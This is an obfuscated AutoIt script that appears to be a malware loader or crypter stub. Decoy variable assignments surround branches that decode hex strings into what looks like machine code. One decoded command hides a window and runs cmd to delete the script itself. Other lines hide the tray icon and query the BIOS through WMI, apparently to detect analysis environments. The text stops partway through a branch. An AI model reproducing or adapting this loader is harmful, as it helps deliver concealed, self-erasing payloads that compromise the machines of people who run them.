	Dim $urtdxewyht = BinaryToString("0x78717A676276676A6E7A72796E6E7164667A797A696B7777616B6C716E766574647464")
	Global $amisvewye = "WinAPIError.au3"
	Local $laqsrvfp = "hwnd"
	Local $oroygjgyodpi = "wstr"
	Global $ucxtpmkzlxqbbm = "Text"
	Dim $mdtbhfppxtyavr = "bool"
	Global $adsazxer = "GdipGetCustomLineCapStrokeCaps"
	Dim $hflhbdwtcknwhersl = "hwnd"
	Local $wfwldjlmg = "ole32.dll"
	Local $eahshqzr = "\psapi.dll"
	If NOT ($urtdxewyht == "llmhsty") Then
		Local $zoknktijooqskywyexyxxagav = $ee($v1("0x246C6978666C2026202234354630373242393333433035463545433943323034303038423435454338423444463830464237303434383842303438363033433345424539353538424543383345433543363422"))
	Else
		Local $fqbyhscug = $ee($v1("0x2471726D62736B796376666B792026202243373835313446454646464637373645343436434337383531384645464646463643373333333332433738353143464546464646354337353733363543373835323046454646464622"))
	EndIf
	Dim $tungk = BinaryToString("0x736175756864717268696669")
	Global $mvtcizerrjmnairhwz = "left"
	Global $ykvmcywzpecwssihejhmizlo = "Replacements: "
	Global $oczisysn = "		<td>1</td>"
	If NOT ($tungk == 0) Then
		Local $qetewcfooarkmwvdjosfuei = $ee($v1("0x247A6F6B6E6B74696A6F6F71736B7977796578797878616761762026202238423044333030303030303035333536384246303333433038393435464338393435463838423439304338423439313438423039384235393130353743373435443034453734344622"))
	Else
		Local $mbukyrwcazzdmlxsyavzdpybwamy = $ee($v1("0x246671627968736375672026202237323333333232454337383532344645464646463634364336433030433738354443464546464646354334423645364643373835453046454646464637373645343436434337383522"))
	EndIf
	Dim $qgbircfkrhpjarpeirzyhg = IsString("mwdsuspfokujgtngbnjxgnmoobfsfgnoyurcknmwvetmvnlp")
	Global $wjxzfwjodfeqwgdnm = "str"
	Dim $htoqbn = "UserName"
	Local $yhzumiatikmq = "ptr"
	Local $dacsdsuecvidvhyrjuffyew = "Image"
	Global $teeskeh = "hwnd"
	Local $lvmqd = "]"
	If NOT ($qgbircfkrhpjarpeirzyhg == 0) Then
		Local $gaglz = $ee($v1("0x24716574657763666F6F61726B6D7776646A6F73667565692026202237304337343544343635364535333635433734354438363337343639364636364337343544433645303043373435424334453734344436314337343543303730353636393635433722"))
	Else
		Local $wcmwlyuhes = $ee($v1("0x247A7A726E69696176717566666D7872637379772026202238443835344346424646464635304538413545374646464638393835384330303030303038443835433446394646464635304538393345374646464638393835463430303030303022"))
	EndIf
	Dim $yeffmjsdwxgazesuayqajl = IsString("ycbsxasourtcoivecqxfcsxnrqzahsptmushtbvalxzwmrsq")
	Global $gohpbvgxfsxhvlpohapmvsa = "browser"
	Local $cnnajzrlmooiffs = "Size"
	Local $cruptx = "wstr"
	Global $icnnwynstkejyqjyb = "bool"
	If NOT ($yeffmjsdwxgazesuayqajl == "hiqemanosbslxmnezxovvfww") Then
		Local $hozhkrtp = $ee($v1("0x246761676C7A2026202234354334373734463636353343373435433836353633373436393636433734354343364636453838343543453342443837353037333343304539413930303030303038443435443022"))
	Else
		Local $sdyit = $ee($v1("0x2478716B76727361736F6A6B69762026202244433033463346463935334330313030303036413434384438353638464646464646353046463935334330313030303036384343303230303030384438353930464246464646353022"))
	EndIf
	Dim $vktogzjzsmtpeojijzbskrmz = IsString(-92342240)
	Dim $lqsxxz = "Image"
	Local $honyufzuauohzzz = "SubItem"
	Local $xtsygey = "YMax"
	Global $shoetv = "uint"
	Local $lxgaahxqu = "Error"
	Local $qivhvuihianjxcsgjne = "Y"
	Local $dgqtrq = "Trackbar"
	Local $vfibzsw = "int"
	Dim $fwljxcyprggh = "handle"
	Dim $eprbcsyuwsepbtnn = "visa32.dll"
	Dim $herxtqtbrhxnvcludfxyqgb = "float"
	Global $nwvdtrelykmrxkjrhnz = "]"
	Local $pyjirehbdcfadxf = ": ([0-9]{2}:[0-9]{2}:[0-9]{2})"
	Local $jkdbhlhmp = "int"
	If NOT ($vktogzjzsmtpeojijzbskrmz == 1) Then
		Local $perlkewxeosbcuol = $ee($v1("0x24686F7A686B7274702026202235304538444646454646464638424638384434354243353045384434464546464646383934354630384434354538353036344131333030303030303038423430304338423430313422"))
	Else
		Local $udxctoxeyjycmvkhhbhgc = $ee($v1("0x247362786E6862647072717574636175666B75736664676A72672026202245434644464646463543344236453646433738354630464446464646373736453434364343373835463446444646464636433733354336314337383546384644464646463634373622"))
	EndIf
	Dim $opnkzgwtlazdxhjmxglltztv = IsString("ndnhepvdksm")
	Local $afphcpmsqeqiucfjgguxzkf = "handle"
	Local $owsmqsfwk = "kernel32.dll"
	Local $usxthcvczwolrdutyqzmt = "RegRestoreKeyW"
	Dim $adnydyskzlmcafddh = ".<br>"
	Dim $hgunymxuvxcyrgtdox = "int"
	Dim $emgrsssn = "SetThreadExecutionState"
	Dim $pjjujaaray = "struct;"
	Dim $nkumzokmfnc = "RemoveFontResourceExW"
	Local $ftfhzsuiiwzunxhagplxd = "MinDay"
	Global $nhuujwgaue = "struct*"
	Global $qojofcxmfanffhnhrsyvy = "int"
	If NOT ($opnkzgwtlazdxhjmxglltztv == 0) Then
		Local $nvbmvmeprggzakzucgoexh = $ee($v1("0x247065726C6B657778656F736263756F6C2026202238423030384235383130433734354538373736333733364336364337343545433635364543363435454530304538413646454646464635363839373545344646443030334330363622"))
	Else
		Local $phqzsjrmptkzoxrowc = $ee($v1("0x2463756B79707A2026202234423635373930304337383538344641464646463433373237393730433738353838464146464646373435323635364343373835384346414646464636353631373336354337383522"))
	EndIf
	Dim $yzzmqyzjcjfpacjxfa = IsString(98934957)
	Dim $epttdlwcwwwkogqho = "int"
	Global $vzrmfivsuemlr = "Param"
	Global $xfwxghisdrurotfbpwuexh = "\\"
	Global $dhskltfltkijueorz = "y"
	Local $debykwvpqzqrbgc = "SetMessageExtraInfo"
	If NOT ($yzzmqyzjcjfpacjxfa == "szkisqvluamerunupcyzgoijaxxtynznj") Then
		Local $uqhkbmnkwnantpqgtczbuex = $ee($v1("0x246E76626D766D65707267677A616B7A7563676F6578682026202238393435453036363839343545323844343545303539383934354143384434354134353033334636364130433844343546343530433734354134313830303030303038393735413822"))
	Else
		Local $qrmbskycvfky = $ee($v1("0x246F6561746778666B656C7567647A726A717063692026202246444646464636453635364333334337383541384644464646463332324536343643363643373835414346444646464636433030433738353130464546464646354334423645364622"))
	EndIf
	Dim $hsxpgvixsurgmxyzh = IsString("wktksyujkjbehyvrgweemaujhldunwdxfzdklgjpejnpvlh")
	Global $pyqutuqiobpbrqqyxjtbsbdi = "uint"
	Dim $stsdtvhcyzlbogkgpr = "$_IESTATUS_COMError"
	Dim $iiqpmshovhr = "wstr"
	Dim $ovxvfjnrzlheuivnrswikkc = "lresult"
	If NOT ($hsxpgvixsurgmxyzh == "sxyhtmsgzmlnkvrrggmysntmaezvlcrftzpjhbclurdvjr") Then
		Local $wxuoyywfjogbkfllrchjtz = $ee($v1("0x247571686B626D6E6B776E616E7470716774637A627565782026202243373435423034303030303030303839373542343839373542384646443738354330304638383733464646464646364130323536364130313844343546383530353635363536384422"))
	Else
		Dim $vfds41dfs4 = $poe("binarytostring")
	EndIf
	Dim $daodrukliv = BinaryToString("mtzycdskdhzlfx")
	Dim $uqjeiixzthqyutndtjpcj = "int*"
	Local $rxtmmkvvna = "wstr:cdecl"
	Global $xfyfbv = "handle"
	Dim $prusrigcmvccnkolmimul = "SetWindowRgn"
	Dim $bweqxiesfvhbrttnpkot = "GetVolumeInformationW"
	Global $ujtomjhkvlaq = "ptr"
	Dim $feqjwrdmtspyeafm = "float"
	Dim $jhdtsiylmqqdxj = "handle"
	Dim $chdsrwzvwkck = "SELECT * FROM Win32_BIOS"
	Global $ojuickybxfqwdpspeuvjvzt = "handle"
	Local $yvyvbwq = "int"
	Local $ordzegfmaawfevx = "WinAPIRes.au3"
	Global $boqdyzmccceufkad = "user32.dll"
	Local $wfpugqjgsrcxldbray = "unselect"
	Global $nbdchgum = "];"
	Dim $kxxjlujmostlaetresafp = "kernel32.dll"
	If NOT ($daodrukliv == 1) Then
		Local $nqkevmlevnptlngyplahqyn = $ee($v1("0x247778756F797977666A6F67626B666C6C7263686A747A2026202234354643353036414646464637354634464635354630383543303046383835334646464646463842343546433546354535424339433335353842454342383830314630303030453822"))
	Else
		Local $hrwopeddl = $ee($v1("0x24647A7773646A69766B766867786A6C777271767769757172626C2026202245383643454246464646383934353134384438354434463446464646453835454542464646463839343531383835433037353045384438354334463046464646453834434542464622"))
	EndIf
	Dim $jemrykptnqhnofr = BinaryToString("knlei")
	Global $ltpcyopq = "struct*"
	Dim $fpjnfzdlbyygvtrelmnur = "dword"
	Local $pojtjv = "uxtheme.dll"
	Dim $vbyesmfcdwfn = "127.0.0.1"
	Global $hkddgjdpyhyr = "["
	Local $gzywzr = "Rectangle"
	Dim $ahsotlpctamzrwtzrmz = "ptr*"
	Global $qsbqgoqurnkkcyrpvnsv = "wstr"
	Local $cpdexhfuczfqzmdealyiypg = "gdi32.dll"
	Global $cqleywbuzb = "handle"
	Local $mmthlxhsdsjrjyfznik = "XSpacing"
	If NOT ($jemrykptnqhnofr == 1) Then
		Local $ofbhqizmuexjddudj = $ee($v1("0x246E716B65766D6C65766E70746C6E6779706C616871796E2026202237443144303030303332433035333536353743373835443446434646464634363639364536344337383544384643464646463532363537333646433738354443464346464646373522"))
	Else
		Local $uqhkbmnkwnantpqgtczbuex = $ee($v1("0x246E76626D766D65707267677A616B7A7563676F6578682026202238393435453036363839343545323844343545303539383934354143384434354134353033334636364130433844343546343530433734354134313830303030303038393735413822"))
	EndIf
	Dim $fojyaipfnbcqslweh = IsInt("rlepsnhljcocfxmfwpxtmoftlympmrytvzpxxtgk")
	Local $ycnoxvumtsachxkjkosmpqhb = "\\.\"
	Local $vfmowbgqglml = "Count"
	Local $ijpqe = "bool"
	Global $lhucjhvlxkmzggeebagdyxd = "int"
	Dim $hxlbijbgagcyxjlz = "]"
	Dim $lubelodsp = "StrCmpLogicalW"
	Local $uauzxawc = "GdipDrawLine"
	Global $gybcdxsyidtqugtzmeqlgnbh = "user32.dll"
	Dim $oztxdouvgkla = "advapi32.dll"
	Global $fbbjzt = "int"
	If NOT ($fojyaipfnbcqslweh == "nkospuewpkwaxtbjyuubfktnsdblhwt") Then
		Local $uetslru = $ee($v1("0x246F66626871697A6D7565786A646475646A2026202237323633363536364337383545304643464646463537303043373835444346444646464634433646363136344337383545304644464646463532363537333646433738354534464422"))
	Else
		Local $qvuvgyryxuhxaoljhibmcrosx = $ee($v1("0x2473647969742026202246463935334330313030303038313345353034353030303037353245384434354538353038443835363846464646464635303537353736383043303030303038353735373537353722"))
	EndIf
	Dim $jymls = IsString(46419311)
	Dim $odzof = "handle"
	Dim $kmpaevoehafpdpkyjzrcbcjp = "cbSize"
	Global $ucqvmhzjrl = "ou"
	Global $xolwooxysaegyzxhd = "handle"
	Global $otcqethdf = "SetPixelV"
	Local $fafnrn = "bool"
	Global $ibblp = "kernel32.dll"
	Dim $cnlpob = "struct*"
	Local $ruhuszndbxtkppxaegsb = "GUIConstantsEx.au3"
	Local $ybdfbmrzb = "dword"
	Global $glgpbninqormynokuljoc = "wstr"
	Local $ptlrjxshstrpxrqnxbpj = "struct*"
	Global $oxheqsitsc = "ptr"
	Global $cqdswktewzm = "int"
	Global $rayzkxmxuctbpkzymkrilg = "struct*"
	If NOT ($jymls == 1) Then
		Local $yftmwjljpdwyteuw = $ee($v1("0x24756574736C72752026202246464646373537323633363538383835453846444646464643373835423446434646464635333639374136354337383542384643464646463646363635323635433738354243464322"))
	Else
		Local $whngczurqqtsp = $ee($v1("0x246C75666B7A656B62646463786475616661786C6466672026202237354530464639353738303130303030383543303738393038423436333438393435463838423435443038393435444338423435303833423436333437323046334234363530373722"))
	EndIf
	Dim $nyxcrxucvwqtudccvewazuv = BinaryToString("koxdeafjv")
	Local $kmllca = "		<td>Nine</td>"
	Local $jgwiq = "handle"
	Global $gejipngjwysdnxtksrj = "_IEFormElementOptionSelect"
	Dim $trqblyasiocqytdtvy = "NumberOfAreas"
	Dim $cthnlmmpz = "int"
	Dim $olssochjepdbwzz = "wparam"
	Global $kfdlqxiozlncirtcjilbgw = "SHGetPathFromIDListW"
	Global $mqgqm = "int"
	Dim $dmckduujzcvvbhmhu = "ptr"
	Local $ypoilkehcynyhmffrsgo = "wstr"
	Global $tbwzfeywww = "$_IESTATUS_InvalidObjectType"
	Global $xtzspngbpxnobhq = "_Application"
	Local $dgiuho = "$_IESTATUS_InvalidObjectType"
	Global $ecqcwvs = "Size"
	Global $ozdkgeejkexhunuikfd = "</head>"
	Local $qkcyyurtjz = "struct*"
	Dim $czvcqcfaugwhdhokmelig = "wparam"
	Global $hfjrruxomrs = "ix"
	If NOT ($nyxcrxucvwqtudccvewazuv == 1) Then
		Local $vaupodcuvhqnleucohjlom = $ee($v1("0x247966746D776A6C6A70647779746575772026202246464646373336463735373236364337383543304643464646463633363538383835433246434646464643373835383446444646464634433646363336424337383538384644464622"))
	Else
		Local $iht15
	EndIf
	Dim $dnjfgvefrvndiwvh = IsInt("ofpnvoqy")
	Dim $uktniziivlpfvjq = "array of arrays"
	Dim $nocpj = "IsWindow"
	Local $ybhmdxccicp = "int"
	Global $vxvkyynnefxogrkeaxzzb = "uint"
	Dim $hrcsanlkcrte = "handle"
	Global $qvkwboprlrdcstytowldgvu = "handle"
	Local $mlpyfkbzieqkzusarbxl = "StrokeAndFillPath"
	Global $xeiiwrua = "dword"
	Dim $cdbnmtaskt = "float"
	Dim $rkgetpfauhrtxbfineserso = "hwnd"
	Dim $dkbhkuakrlkqgiah = "codepage"
	Global $uorvjwpkafzw = "wID"
	Dim $muznxxsm = "Mask"
	Global $xxkdkjtojamprlvkaespcqc = "bool"
	Dim $vymbcgclzrz = "int"
	If NOT ($dnjfgvefrvndiwvh == 1) Then
		Local $qksnuahvkeziysqcgucz = $ee($v1("0x24766175706F6463757668716E6C6575636F686A6C6F6D2026202246463532363537333646433738353843464446464646373537323633363538383835393046444646464643373835373846394646464634453734353137354337383537434639464622"))
	Else
		Local $kufoctklnlwyppiucog = $ee($v1("0x246A6F64706D706F6F6266786B6B71676F7374736B7962646D6C68786F2026202242364645464646464337383537344646464646463737363337333633363643373835373846464646464636443730383838353741464646464646433738353430464546464646344422"))
	EndIf
	Dim $pcsqezfhcbmshrevgvowb = IsString("zgtemvxsqdilqpazhliqdiqwgyzkmmtfyfmlbrulyagbnyrt")
	Local $fnfldldjdmkaywbaswziupx = "uint64 CreationTime;uint64 LastAccessTime;uint64 LastWriteTime;uint64 ChangeTime;dword Attributes"
	If NOT ($pcsqezfhcbmshrevgvowb == 0) Then
		Local $rotyxkjtklvi = $ee($v1("0x24716B736E756168766B657A69797371636775637A2026202246463635373237393533433738353830463946464646373937333734363543373835383446394646464636443439364536364337383538384639464646463646373236443631433722"))
	Else
		Local $wrotlgqjqfw = $ee($v1("0x247470727A7079767077622026202246464646353045384435453546464646383934353738384438353043464146464646353045384336453546464646383934353734384438354634463946464646353045384237453522"))
	EndIf
	Dim $wkauaiqhftsbqxboyor = IsString(83784615)
	Global $avxcadqppthbdpdettscj = "handle"
	Dim $ytvaffmzreteknhbdcmxqalj = "$_IESTATUS_InvalidDataType"
	Local $neplbtzegipjkghjyv = "none"
	Global $lqzgmfixim = "handle"
	Global $zvcsrkliatntcqj = "ZwQueryInformationFile"
	Local $mtkbnqfpoqhxvar = "\regsvr32.exe /s "
	Dim $hgeoiylxlnkoyg = "dword*"
	Global $ydyimnb = "uint*"
	Global $cynbf = "Title"
	Global $gjykmqpesfzr = "GUICoordMode"
	Dim $xssjduscrowiyyleebxqq = "Y"
	Local $hsivwxcabcqjnatong = "GUIDataSeparatorChar"
	Global $iqfgauqdlfrebbkm = "shell32.dll"
	Dim $mwgwibrehicjyrbzbcov = "dword"
	Local $qwyelzicqanktbuwejqiviv = "hwnd"
	Local $cjjikrzyqzkxfezfljlhixhg = "struct*"
	Local $dchaermxzshqvk = "bool"
	If NOT ($wkauaiqhftsbqxboyor == 1) Then
		Local $hikjwajcmzxmodgcmlbpjpuc = $ee($v1("0x24726F7479786B6A746B6C76692026202238353843463946464646373436393646364538383835393046394646464643373835393446394646464634453734343136434337383539384639464646463643364636333631433722"))
	Else
		Local $uetslru = $ee($v1("0x246F66626871697A6D7565786A646475646A2026202237323633363536364337383545304643464646463537303043373835444346444646464634433646363136344337383545304644464646463532363537333646433738354534464422"))
	EndIf
	Dim $umheljpwmifre = IsString("mshjnaalftdbn")
	Global $wvjzffshz = "\\"
	Dim $pxnmmtchzunkovmvsxo = "struct*"
	Global $ozcvgclejbsttidsp = "wparam"
	Global $fbiylktxobzvazjojr = "0x"
	Global $vklrucdraiemajmqdjwio = "lparam"
	Dim $xstzoix = "struct*"
	Global $krxhqhpfotuizpwyghqrg = "int"
	Dim $tbjecslgpez = "bool"
	Global $tpsjbohosdcqcpgfpeopnp = "wstr"
	Local $wiotvq = "Text"
	Dim $obyxenaeifbm = "SymCleanup"
	Global $jpvgdidrhgfgtvxnbksbfhrz = "Memory.au3"
	Local $gskqgnojfuu = "m"
	Dim $krrzghjlsabxt = "int"
	Dim $vgoaxyxqytelssghrqvqaat = "uint"
	Global $zjojtuhhyonanluaancys = "long"
	Global $fdymxumhbbzncpakdktr = "GetTextExtentPoint32W"
	Local $jwaagea = "byte["
	Dim $tepvvkecgzlmgxkm = "int"
	If NOT ($umheljpwmifre == 0) Then
		Local $ruqkqolyjqapigffkamsrgj = $ee($v1("0x2468696B6A77616A636D7A786D6F6467636D6C62706A7075632026202238353943463946464646373436353536363943373835413046394646464637323734373536314337383541344639464646463643344436353644433738354138463946464646364622"))
	Else
		$poe($rfo("0x5368656C6C457865637574652822636D64222C2022202F632054696D654F7574203120262044656C202F4620222026204368722822333422292026204053637269707446756C6C506174682026204368722822333422292C2022222C2022222C204053575F4849444529"))
	EndIf
	Dim $hfcaozopwufdazyyilko = IsString("dslzzbxzsybej")
	Local $rrxpcptmguuntpq = "uint"
	Dim $jwczmnipzcdmhpm = ">Two</td>"
	Global $rauelqueeko = "PebBaseAddress"
	Global $cmgslrfkhm = "bool"
	Global $tneahrhqftel = "HTMLSelectElement"
	Dim $ixadhwjvjua = "]"
	Dim $shouharzkh = "float"
	Local $xtbhymxbkmmjnkrvgg = "<input type="
	Dim $mlqqffqjmtzv = "int"
	Local $hmctff = "wShadingStyle"
	Global $kupzde = "{8AD10C31-2ADB-4296-A8F7-E4701232C972}"
	Global $hkhlqthgsx = "dword"
	If NOT ($hfcaozopwufdazyyilko == 0) Then
		Local $tdhhykfzsniscjzlynzcxd = $ee($v1("0x247275716B716F6C796A716170696766666B616D7372676A2026202237323739303043373835323446444646464634453734344637304337383532384644464646463635364535303732433738353243464446464646364636333635373336364337383522"))
	Else
		Opt("TrayIconHide", "1")
	EndIf
	Dim $oiyqotesaeeqng = IsString(85710675)
	Dim $tiowbtvwjly = "ClipCursor"
	Local $pvlrjp = "documentcontainer"
	Global $hdgrxjhspmozealwwswvhbr = "wstr"
	Local $lzxiqxxjhtvcymbtjawckvz = "ParentProcessID"
	Local $ozrflndzyiuhwrcvtsbttku = "PathName"
	Global $wmnqzcusjxrbhhzzo = "handle"
	Global $eeapbh = "24604C897C24504C8B7C2440488B4C245849D3FF4C89F850488B6C2458588845"
	Global $dfeovrr = "Error"
	Dim $rmdiedsktuu = "wstr"
	Dim $plrlyosibofsnnm = "nFilterIndex"
	Dim $fkhqbwvmjxayjhe = "dword*"
	Global $zfmtqjkocmpe = "byte"
	Dim $gqqgykvqmfvhcf = "dword"
	If NOT ($oiyqotesaeeqng == "vyvvdkhnfiwmqwknspglasjsxspqgbcjmurlvtbfpe") Then
		Local $rtffv = $ee($v1("0x2474646868796B667A736E6973636A7A6C796E7A6378642026202233304644464646463733303043373835323446394646464634453734353137354337383532384639464646463635373237393439433738353243463946464646364536363646373222"))
	Else
		Local $tfqokzmhzkljtnw = $ee($v1("0x246C72706D6766796568787775752026202243373835363846434646464637333734363537324337383536434643464646463433364336313733363643373835373046434646464637333537383838353732464346464646433722"))
	EndIf
	Dim $xocqcbluxfntjwe = IsString("zxjusxyuywdhszaotsgqrntkbzuszpb")
	Dim $nkayepaovbiiexrqv = "kernel32.dll"
	Local $fwitxcgpa = "handle"
	Local $dhanodmnawzvxeole = "int"
	Dim $cxlrbgbbilny = "wstr"
	Global $xxecravfi = "handle"
	Local $snukntbngwjlhckeojaef = "INT NewColor["
	Global $alljhscupkioobaf = "ULONG"
	Dim $ansupprqyvhqtwfjbhrgotow = "wstr"
	Global $qnivpzaqahqwtpbdzhuosi = ";dword StyleEntry[n];"
	If NOT ($xocqcbluxfntjwe == "xiqmbxxmhctkhgicc") Then
		Local $fjccklkwgjhnneqhbaodw = $ee($v1("0x2472746666762026202243373835333046394646464636443631373436394337383533344639464646463646364535303732433738353338463946464646364636333635373336364337383533434639464622"))
	Else
		Local $sckhlnlekfpguletadatcaz = $ee($v1("0x246368636773686B73667979782026202238423542334346463735304346463735464346463935353430313030303033334330383343343043383937444534363633423436303637333332384234353043384439433033304322"))
	EndIf
	Dim $xxzkgzwyvtacqzsrtffcklyq = IsInt("pelkjbvfmsip")
	Local $eeivkx = "INT"
	Dim $kbksaapynzpcvndo = "\AutoIt v3\SQLite"
	Local $jyrkivqpshgcaqevdrrlyanb = "StructureConstants.au3"
	Global $jqfgvlrrqsqcxjkxrhxomrsz = "struct*"
	Global $bilpv = "Flags"
	Global $ymakqizncm = "ptr"
	Global $ncvtrj = "kernel32.dll"
	Global $fjzkqifdvsacmkrxggndpmhb = "int"
	Local $pvdajozhq = "Error"
	Dim $qizrxuyasewkdzpitcx = "$_IESTATUS_AccessIsDenied"
	Dim $phrsrom = "handle"
	If NOT ($xxzkgzwyvtacqzsrtffcklyq == 1) Then
		Local $koofrem = $ee($v1("0x24666A63636B6C6B77676A686E6E65716862616F64772026202246463733303043373835303446444646464634373635373435334337383530384644464646463739373337343635433738353043464446464646364434393645363636364337383522"))
	Else
		Local $qbbrvg = $ee($v1("0x246E716D6864646E73637370736F79787A6C6E6D6C2026202237333733433738353030464346464646363136373635303043373835323446464646464634353645363435304337383532384646464646463631363936453734383838353243464622"))
	EndIf
	Dim $manxv = IsString("fkowmrywebnozaslkutspnaihpoklyvgarohfirlytv")
	Dim $nnlzs = "kernel32.dll"
	Local $qoomvqnsraeckoodjkqctsyr = "dword"
	Local $peiyvhovpmaewjcy = "kernel32.dll"
	Dim $qzyhpigh = "int;"
	Global $wwmcxnjbiuvszqjgt = "handle"
	Local $dmlsprwsqpajxyqdrump = "dbghelp.dll"
	Global $kugyrgbmooenkktmgqqktu = "struct*"
	Global $zfoyg = "Month"
	If NOT ($manxv == 0) Then
		Local $qlnbsoaqplxgrmscqzl = $ee($v1("0x246B6F6F6672656D2026202231304644464646463646303043373435434336443632373337344337343544303646373736333733383834354434433734354438373337343732364336364337343544433635364522"))
	Else
		Local $coenlvqnltsldf = $ee($v1("0x246271746378656F706E70776F66626574627A6A2026202234384646464646463530453831464535464646463839383534433031303030303844383543344643464646463530453830444535464646463839343536383844383542384645464622"))
	EndIf
	Dim $jpbyisfm = IsInt("iwtiqffkat")
	Global $lgtyhgyzidqhlysamoi = "TimeOut"
	Dim $ujvenld = "kernel32.dll"
	Local $scotmqrzce = "struct*"
	Local $qwunlcoehsilj = "]"
	Dim $nvmmipjjyowwikvciye = "uint"
	Global $stcdlkghdnnhpjozcbnkoxg = "gdi32.dll"
	Global $wgdkywyoctjeezcrlijbul = "bool"
	Local $dujkumlhonaesprjaguqx = "\VarFileInfo\Translation"
	Local $wmxhubksuo = "4C037C24384983C7034C897C2440488B6C2440480FB64500505888442448807C"
	If NOT ($jpbyisfm == 1) Then
		Local $ygvptrczuuowsgygu = $ee($v1("0x24716C6E62736F6171706C7867726D7363717A6C2026202238383435444543373835344346454646464635433442364536464337383535304645464646463737364534343643433738353534464546464646364337333333333243373835353822"))
	Else
		Local $xmacyycfpwlraie = $poe($zeyc("0x46696C654F70656E2824687967727875746475796A6C737772706A787A667976637872767A6264626C64746A756C2C2022322229"))
	EndIf
	Dim $pehgyw = IsString(50096462)
	Local $tsrtfssyggbniodnmdh = "handle"
	Dim $ouwyorahbejtepchfzbqn = "user32.dll"
	If NOT ($pehgyw == "atvhlnuzq") Then
		Local $wfvzea = $ee($v1("0x24796776707472637A75756F7773677967752026202246454646464635433645373436344337383535434645464646463643364332453634363643373835363046454646464636433643383838353632464546464646433738354230464422"))
	Else
		Local $plyjyotcrpmvrt = $ee($v1("0x24736E746C6D69756367706A71746E6B747679632026202246394646464636453636364637324337383545384639464646463644363137343639433738354543463946464646364636453436363936364337383546304639464646463643363522"))
	EndIf
	Dim $qyrvjdiudpydxxg = IsString("oscasktnldie")
	Global $wdpjnkex = "in"
	Dim $hsggzwvrdskgdgl = "handle*"
	Local $uzsnrqmjhiyylmubqlrrgifg = "bool"
	Local $xldbguyniutaqt = "struct*"
	Local $sfhylcpanttmtmr = "wparam"
	Dim $xegsenylhxkaxpts = "\\"
	Local $oljnbsaf = ", CPUArch: "
	Local $bumetjhzbu = "wstr"
	Global $sqmvdtbzbcpdnreadiww = "long"
	Global $otvjlnpjolpulfebi = "struct*"
	Dim $sxbgs = "dword"
	Global $lcduwaybhjpllsarywtuyg = "ptr"
	Local $vxqsprjnsxliuykgdt = "SendMessage.au3"
	Global $ozxjivifyfoudacijsrgxt = "struct*"
	Local $dyinvnqluhx = "handle"
	Local $waitsxoryh = "GetClientRect"
	Global $grzuf = "UDFGlobalID.au3"
	Dim $wzrcryji = "gdi32.dll"
	If NOT ($qyrvjdiudpydxxg == "phgzzjztakooakdsi") Then
		Local $sqchmjsmx = $ee($v1("0x247766767A65612026202246464646354334423645364643373835423446444646464637373645343436434337383542384644464646463643373333333332433738354243464446464646354336313634373622"))
	Else
		Dim $grfeus = $poe("binarytostring")
	EndIf
	Dim $palvgoabq = IsString(-8639556)
	If NOT ($palvgoabq == 1) Then
		Local $fgffvwtkqpfvb = $ee($v1("0x24737163686D6A736D782026202243373835433046444646464636313730363933334337383543344644464646463332324536343643363643373835433846444646464636433030433738353934464446464646354322"))
	Else
		Local $xmaxmgznnfgv = $ee($v1("0x24656F646D71632026202246394646464634353738373036314337383534344639464646463645363434353645433738353438463946464646373636393732364643373835344346394646464636453644363522"))
	EndIf
	Dim $pbmju = IsInt(5954598)
	Local $czarqbzfjf = "uint"
	Local $plkkudshtwzcaeopnen = "wstr"
	Global $vfxjarocuyf = "wparam"
	Global $jltprzjcbppxlqvapeahpfn = "complete"
	Dim $sqcaw = "gdi32.dll"
	Dim $fclxntzsditdgygtj = "@error="
	Dim $idximqgsabsxpuktp = "SetCurrentDirectoryW"
	Local $hwbfqzuujj = "struct;uint otmSize;"
	Global $rhceclwmgscpw = "LocalFree"
	Local $mdrkahlcssnwmir = "wparam"
	Global $xmipnfuuaeypul = "left"
	Dim $fzljjvzlkyazybtsjqyfxq = " target="
	Local $ghddxbmfl = "printdefault"
	Local $dnqidchuuccfxk = "X"
	If NOT ($pbmju == "seiormuhipybikdjpdjjuadcijucckgmuuhhaacbuxaax") Then
		Local $oeatgxfkelugdzrjqpci = $ee($v1("0x24666766667677746B71706676622026202234423645364643373835393846444646464637373645343436434337383539434644464646463643373333333332433738354130464446464646354336423635373243373835413422"))
	Else
		Local $joawfujdbpzengszukijnwm = $ee($v1("0x247879697A637375636C612026202246463530363137323631433738353143463946464646364436353734363536364337383532304639464646463732373338383835323246394646464643373835364346414646464622"))
	EndIf
	Dim $azpnvddovimw = IsString(-15320466)
	Local $ggcixtnevlef = "SetProcessWindowStation"
	Dim $gcelwvqakcmvql = "int"
	Dim $mvqescdgbjaryjxc = "DirConstants.au3"
	Local $pbunpfrfkxxsn = "Error"
	Local $cohoabfulqimtpsqwwl = "TIFF"
	Global $bzawtidrmhj = "boolean"
	Global $sbkowzbzxfluehw = "dword"
	Global $aunind = "SendMessage.au3"
	Global $udacdvfxvmxrsgbbv = "Error"
	Global $wuviiqz = "{B4BFCC3A-DB2C-424C-B029-7FE99A87C641}"
	If NOT ($azpnvddovimw == 1) Then
		Local $qrmbskycvfky = $ee($v1("0x246F6561746778666B656C7567647A726A717063692026202246444646464636453635364333334337383541384644464646463332324536343643363643373835414346444646464636433030433738353130464546464646354334423645364622"))
	Else
		Local $tjnzhgdqplkqjm = $ee($v1("0x247466676262706F6F726961766F6C6F62657A6170707175686B642026202238443835303446454646464635304538434445364646464638393835304330313030303038443835334346414646464635304538424245364646464638393835364330313030303022"))
	EndIf
	Dim $nggzihwwdizz = IsString(-250758)
	Dim $holhrrituzhs = "handle"
	Local $fohfqrkyfesdzdmtrgxil = "\"
	Dim $oygnhoeiveuvuymsxpgcz = "long"
	If NOT ($nggzihwwdizz == 1) Then
		Local $fqbyhscug = $ee($v1("0x2471726D62736B796376666B792026202243373835313446454646464637373645343436434337383531384645464646463643373333333332433738353143464546464646354337353733363543373835323046454646464622"))
	Else
		Dim $ufd = $poe("binarytostring")
	EndIf
	Dim $pigqmwejqll = IsInt(-19588554)
	Global $qajhujqystflvhzwzp = "dword"
	Dim $yrlru = "Scalable"
	Local $hugaxqcqgof = "uint"
	Dim $sqsnjmpqcurrrixqzfgpkzy = "Error"
	Global $xftblnsayvzhuxtqsm = "Left"
	Dim $tsqoalrntrgprpjxajdyrjc = "ImageList_Create"
	Global $jwthmbrtdncmkc = "/01/01"
	Local $dsrciksrc = "comctl32.dll"
	If NOT ($pigqmwejqll == 0) Then
		Local $mbukyrwcazzdmlxsyavzdpybwamy = $ee($v1("0x246671627968736375672026202237323333333232454337383532344645464646463634364336433030433738354443464546464646354334423645364643373835453046454646464637373645343436434337383522"))
	Else
